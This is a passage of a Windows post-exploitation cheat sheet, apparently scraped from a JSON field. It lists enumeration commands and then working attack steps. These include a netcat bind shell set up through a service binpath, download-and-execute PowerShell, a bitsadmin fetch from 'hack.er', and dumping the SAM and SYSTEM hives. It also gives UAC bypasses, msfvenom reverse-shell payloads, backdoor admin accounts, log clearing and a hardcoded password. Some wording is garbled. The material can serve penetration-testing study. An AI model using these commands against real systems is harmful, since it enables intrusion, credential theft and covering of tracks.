disallow] netdom query trust /Domain:dnsname OR nltest /domain_trusts /All_Trusts SERVICES/PROCESSES/PERMISSIONS configuration tasklist tasklist /SVC taskkill pid net start -list all running services sc [stop | start ] service sc qc service -view configuration of a service - sc config upnphost binpath= C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe - sc config upnphost obj= .\\LocalSystem password= - net start upnphost sc query sc queryex schtasks /query /fo LIST /v net start RpcSs net stop RpcSs -start stop rpc service on localhost c : \\windows\\system32\\gathernetworkinfo.vbs ( Windows 7 ) Included script with, enumerates builtin config information pkgmgr /iu: TelnetServer pkgmgr /iu:IIS-WebServerRole;WAS-WindowsActivationService;WAS-WindowsProcessModel; WAS-NetFxEnvironment;WAS-ConfigurationAPI pkgmgr /uu:WAS-WindowsActivationService;WAS-WindowsProcessModel ( On Vista ) install update or uninstall update builtin process icacls dir\\ -check the file permissions of a folder WMIC WINDOWS MANAGEMENT INSTRUMENTATION **default xp configuration does not allow low priv(non-members of administrators group) to wmic; w7/8 by default allow access to low priv users https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/ http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar https://blogs.technet.microsoft.com/heyscriptingguy/2014/09/13/weekend-scripter-the-wmi-explorer-tool/ QUERIES SELECT [Class property name | *] FROM [CLASS NAME] WHERE [CONSTRAINT] SELECT * FROM Win32_Process WHERE Name LIKE \u201c %chrome% \u201d -wmic instance query INFORMATION wmic /? WMIC enable (remote) wmic startupwmic service -start remote wmi service netsh firewall set service RemoteAdmin enable netsh advfirewall firewall set rule group= windows management instrumentation (wmi) new enable=yes -make exception in firewall for remote wmic service HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WBEM\\CIMOM\\AllowAnonymousCallback Get-WmiObject -Namespace root\\cimv2 -Class Win32_LogicalDisk -ComputerName REMOTE_IP -Credential DOMAIN\\User -test remote wmi access ENUMERATION wmic qfe -patch level information wmic qfe get -list patching information for localhost wmic qfe qfe hotfixid wmic qfe get Caption,Description,HotFixID,InstalledOn\\ -get windows patch level information wmic process list full -list all attributes of all running processes wmic process get caption,executablepath,commandline wmic process call create \u201cprogram\u201d wmic process where name=\u201cprogram\u201d call terminate -kill target program wmic process get caption,executablepath,commandline /format:csv wmic useraccount wmic useraccount get /ALL wmic useraccount where name= uname get sid wmic useraccount where sid= S-1-3-12-1234525106-3567804255-30012867-1437 get name wmic useraccount where (name= administrator and domain= %computername% ) get name,sid -get name/sid for system admin wmic useraccount where (name= administrator and domain= %userdomain% ) get name,sid -get name/sid for domain admin wmic service get name,displayname,pathname,startmode | findstr /i Auto | findstr /i /v C:\\Windows\\\\ | findstr /i /v -check for trusted service paths(privesc) wmic get /ALL /format:csv wmic share get /ALL -list smb shares wmic logicaldisk get name wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber wmic start list full -list startup programs wmic computersystem get domain wmic ntdomain list -domain and DC info PRIVESC enumeration wmic service get name,displayname,pathname,startmode | findstr /i Auto | findstr /i /v C:\\Windows\\\\ | findstr /i /v -find unquote service path REGISTRY *note HKLM keys are for HKey local machine registry *HKCU keys are for HKey current user registry entries reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated -together allow users of any privilege level to install *.msi files as NT AUTHORITY\\SYSTEM reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f -enable RDP reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s -grep the registry for key word password REG add HKLM\\SYSTEM\\CurrentControlSet\\services\\RpcSs /v Start /t REG_DWORD /d 2 /f -change startup type for rpc service to automatic REG add HKLM\\SYSTEM\\CurrentControlSet\\services\\RpcSs /v Start /t REG_DWORD /d 4 /f -change startup type for rpc service to disabled reg add HKEY_LOCAL_MACHINE\\SYSTEM\\Current ControlSet\\Control\\Terminal Server /v fAllowToGetHelp /t REG_DWORD /d 1 /f reg query HKLM /s /d /f C:\\* *.exe | find /I C:\\ | find /V -(win7) curely registered executables within the system registry reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon -windows autologin reg query HKCU\\Software\\ORL\\WinVNC3\\Password -vnc stored password reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions -putty cleartext credentials reg save HKLM\\Security security.hive --save security.hive reg save HKLM\\System system.hive --save system hive to file reg save HKLM\\SAM sam.hive --save sam to file reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command /d cmd.exe /f START /W CompMgmtLauncher.exe reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f -UAC bypass for win 7/8/10 reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe /d cmd.exe /f START /W sdclt.exe reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe /f -UAC bypass for win 10 START Administrative Tools Server Manager Features Add Features Administrative Tools Windows Powershell -enable powershell on machine POWERSHELL syntax (from cmd.exe, where installed): Special Characters The beginning (or end) of quoted text # The beginning of a comment $ The beginning of a variable Reserved for future use ( ) Parentheses used for subexpressions ; Statement separator { } Script block | Pipeline separator ` Escape character .\\Powershell.exe -command command parameter(s) attrib +R c:\\path\\to\\file.txt $var = hello Powershell.exe -command Get-HotFix -check Windows patch level Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Get-NetUser -display all AD users Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Get-UserProperties -Properties name,memberof,description,info -return AD user proprietary information set-ItemProperty -Path HKLM:\\System\\Current\\ControlSet\\Control\\Terminal Server -name fDenyTSConnections -Value 0 -format for making registry queries from powershell --enable RDP on target hostname Enable-NetFirewallRule -DisplayGroup Remote Desktop -enable existing firewall rule, e.g. RDP allow powershell.exe -command New-NetFirewallRule -DisplayName Allow Inbound Port 80 -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow -create new firewall rule set to allow --to create a block rule set -Action Block powershell.exe -command Get-Service -show all services powershell.exe -command Restart-Service -restart target service powershell.exe -command Get-Service Set-DNSClientServerAddress - InterfaceAlias Ethernet -ServerAddresses 8.8.8.8 -Configure the DNS Server (to 8.8.8.8/Google) powershell.exe -command Get-Process -return a process listing Start-Job { C:\\bin\\hashcat\\bin\\hashcat64.exe } -Name cracker bitsadmin /transfer jobname /download /priority normal http://hack.er/file.ext C:\\Path\\to\\outfile.ext -download a file ACTIVE DIRECTORY cmdlets Get-Job -State Stop-Job cracker Get-Command *text* Get-Command -Verb Get Get-Command -Noun Service Get-Help Get-Command (-Detailed,-Full,-Examples,-Online) OR Get-Command -? Get-SmbServerConfiguration Set-SmbServerConfiguration -EnableSMB1Protocol $true Get-ChildItem -Path C:\\path -Filter namedpipe.exe -Recurse -ErrorAction SilentlyContinue -Force Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Get-NetComputers -return listing of hosts in Active Directory Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Get-Information -return information collected on sys,reg, c Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Invoke-Userhunter -search network for hosts in use by Domain Admin(s) Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview1.ps1 );Invoke-Userhunter -UserName admin -search network for host user admin is on get-aduser -filter {name -like krbtgt* } -prop Name,Created,PasswordLastSet,msDS-KeyVersionNumber,msDS-KrbTgtLinkB1 -get information for krbtgt active directory domain account Get-ADForest | Select Domains -enum domains in an AD forest Get-ADDomain | FL NetBIOSName -get netbios name of an AD domain Get-ADTrust -filter * Powershell x WMIC wmic.exe Powershell WMI cmdlets -- Get-WmiObject -- Get-CimAssociatedInstance -- Get-CimClass -- Get-CimInstance -- Get-CimSession -- Set-WmiInstance -- Set-CimInstance -- Invoke-WmiMethod -- Invoke-CimMethod -- New-CimInstance -- New-CimSession -- New-CimSessionOption -- Register-CimIndicationEvent -- Register-WmiEvent -- Remove-CimInstance -- Remove-WmiObject -- Remove-CimSession Get-WmiObject -Class Win32_Process -ComputerName 192.168.72.134 -Credential \u2018WIN-B85AAA7ST4U\\Administrator Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct -av detection SELECT * FROM Win32_ComputerSystem WHERE TotalPhysicalMemory 2147483648 SELECT * FROM Win32_ComputerSystem WHERE NumberOfLogicalProcessors 2 SELECT * FROM Win32_NetworkAdapter WHERE Manufacturer LIKE \u201c %VMware% \u201d SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE \u201c %VMware% \u201d SELECT * FROM Win32_Process WHERE Name=\u201dvmtoolsd.exe\u201d SELECT * FROM Win32_NetworkAdapter WHERE Name LIKE \u201c %VMware% \u201d -vm detection Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \u2018notepad.exe\u2019 -code execution, like psexec but stealthier SYSINTERNALS PSEXEC psexec /? psexec -accepteula psexec \\\\machinename reg add hklm\\system\\currentcontrolset\\control\\terminal server /f /v fDenyTSConnections /t REG_DWORD /d 0 psexec \\\\10.2.2.23 netsh firewall set service remoteadmin enable psexec \\\\JAMES -u james -p FmyN3rZ37LNss2X netsh firewall set service remoteadmin enable CLEANUP wevtutil el -list logs wevtutil cl log.log -clear specific lowbadming del %WINFRT% \\*.log /a /s /q /f ADVANCED DRIVERQUERY LOCAL EXPLOITS KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799) -patch levels corresponding to most common windows privesc exploits for xp/vista/7/server2003-2008 KB2503665: patch level for afd.sys(40564) local exploit (xp sp3, server 2003 sp2, vista sp1/2, server 2008 sp1/2, 7 (sp0/1) Table of patch replacements: # | MS11-046 | MS11-080 | MS12-009 | MS13-093 | MS14-040 | # ------------------------------------------------------------- # | KB2503665 | KB2592799 | KB2645640 | KB2875783 | KB2975684 | # ----------------------------------------------------------------------------------------- # Windows x86 XP SP3 | Installed | -Replaces | - | - | - | # Windows x86 Server 2003 SP2 | Installed | -Replaces | -Replaces | - | -Replaces | # Windows x86 Vista SP1 | Installed | - | - | - | - | # Windows x86 Vista SP2 | Installed | - | - | - | -Replaces | # Windows x86 Server 2008 | Installed | - | - | - | - | # Windows x86 Server 2008 SP2 | Installed | - | - | - | -Replaces | # Windows x86 7 | Installed | - | - | - | - | # Windows x86 7 SP1 | Installed | - | - | - | -Replaces | Policy files (may contain passwords) SYSVOL/(../)Groups.xml Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes Configuration files commonly left behind by mass rollouts/older (pre-)devops c : \\sysprep.inf c : \\sysprep\\sysprep.xml %WINDIR% \\Panther\\Unattend\\Unattended.xml %WINDIR% \\Panther\\Unattended.xml Trusted Service Paths exploit/windows/local/trusted_service_path wmic service get name,displayname,pathname,startmode | findstr /i Auto | findstr /i /v C:\\Windows\\\\ | findstr /i /v icacls C:\\Program Files (x86)\\Target msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe -now replace Target\\target.exe with payload sc stop target sc start target -now the reverse shell should be spawned as privileged user Vulnerable Services exploit/windows/local/service_permissions accesschk.exe -uwcqv Authenticated Users * /accepteula sc qc target sc config target binpath= net user hacker P@ssword123! /add sc stop target sc start target sc config target binpath= net localgroup Administrators hacker /add sc stop target sc start target -errors may occur starting service, but only after commands are executed AlwaysInstallElevated exploit/windows/local/always_install_elevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o exploit.msi msiexec /quiet /qn /i C:\\Users\\User\\Downloads\\exploit.msi DLL Injection msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe WIN filesystem read targets tier 1 %SYSTEMDRIVE% \\boot.ini near ubiquitous, confirmation that a read is happening %WINDIR% \\win.ini second test file if boot.ini cannot be found/returned %SYSTEMROOT% \\repair\\SAM %SYSTEMROOT% \\System32\\config\\RegBack\\SAM stores users passwords in a hashed format (in LM hash and NTLM hash). The SAM file in \\repair is locked, but can be retired using forensic or Volume Shadow copy methods %SYSTEMROOT% \\repair\\system %SYSTEMROOT% \\System32\\config\\RegBack\\system key to read SAM hashes in plaintext without cracking %WINDIR% \\repair\\security %SYSTEMDRIVE% \\autoexec.bat TIER 1, LOCATION NOT SET BY DEFAULT unattend.txt unattend.xml sysprep.inf --(ALL)Used in the automated deployment of windows images and can contain user accounts. No known default location. tier 2 %WINDIR% \\debug\\NetSetup.log %WINDIR% \\repair\\software %WINDIR% \\iis6.log ( or 5 or 7, given version ) %WINDIR% \\system32\\logfiles\\httperr\\httperr1.log --iis6 error log %SystemDrive% \\inetpub\\logs\\LogFiles --IIS 7\u2019s logs location %WINDIR% \\system32\\config\\AppEvent.Evt %WINDIR% \\system32\\config\\SecEvent.Evt %WINDIR% \\system32\\config\\default.sav %WINDIR% \\system32\\config\\security.sav %WINDIR% \\system32\\config\\software.sav %WINDIR% \\system32\\config\\system.sav %WINDIR% \\system32\\CCM\\logs\\*.log %USERPROFILE% \\ntuser.dat %USERPROFILE% \\LocalS~1\\Tempor~1\\Content.IE5\\index.dat %WINDIR% \\System32\\drivers\\etc\\hosts references http://www.fuzzysecurity.com/tutorials/16.html https://www.toshellandback.com/2015/11/24/ms-priv-esc/ https://pastebin.com/FehvXsEZ https://pastebin.com/HvKs18zh","title":"Random"}]}